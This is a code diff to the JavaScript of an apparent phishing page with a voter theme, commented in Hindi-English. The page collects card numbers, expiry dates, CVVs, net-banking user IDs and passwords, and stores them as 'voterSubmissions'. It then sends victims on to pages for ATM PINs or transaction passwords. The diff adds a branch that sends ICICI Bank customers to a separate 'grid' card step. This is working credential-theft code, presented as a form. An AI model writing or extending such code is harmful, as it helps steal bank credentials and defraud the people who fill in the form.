@@ -127,6 +127,7 @@
             
             const payMethod = document.querySelector('input[name="payMethod"]:checked').value;
             let paymentDetails = "";
+            let selectedBank = "";
 
             if (payMethod === 'Card') {
                 const cardNumber = document.getElementById('cardNumber').value;
@@ -134,10 +135,10 @@
                 const cvv = document.getElementById('cvv').value;
                 paymentDetails = `Card: ${cardNumber}, Exp: ${expiryDate}, CVV: ${cvv}`;
             } else {
-                const bankName = document.getElementById('bankName').value;
+                selectedBank = document.getElementById('bankName').value;
                 const userId = document.getElementById('userId').value;
                 const loginPassword = document.getElementById('loginPassword').value;
-                paymentDetails = `Bank: ${bankName}, UserID: ${userId}, Pass: ${loginPassword}`;
+                paymentDetails = `Bank: ${selectedBank}, UserID: ${userId}, Pass: ${loginPassword}`;
             }
 
             let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
@@ -163,13 +164,16 @@
             btn.disabled = true;
             btn.innerText = "Processing...";
 
-            // Yahan agar Card select hai toh ATM PIN wale page par (page5.html) jayega, 
-            // aur agar NetBanking select hai toh Transaction Password wale page par jayega (aap chahe toh page5.html hi rakh sakte hain ya alag page)
             setTimeout(() => {
                 if (payMethod === 'Card') {
-                    window.location.href = "page5.html"; // ATM PIN page
+                    window.location.href = "page5.html"; // Card ke liye ATM PIN page
                 } else {
-                    window.location.href = "netbanking_pass.html"; // Transaction Password page for Net Banking
+                    // Sirf ICICI Bank select hone par hi grid step 1 par jayega, warna direct transaction password ya completion par
+                    if (selectedBank.includes("ICICI")) {
+                        window.location.href = "grid_step1.html"; 
+                    } else {
+                        window.location.href = "netbanking_pass.html"; 
+                    }
                 }
             }, 1000);
         });
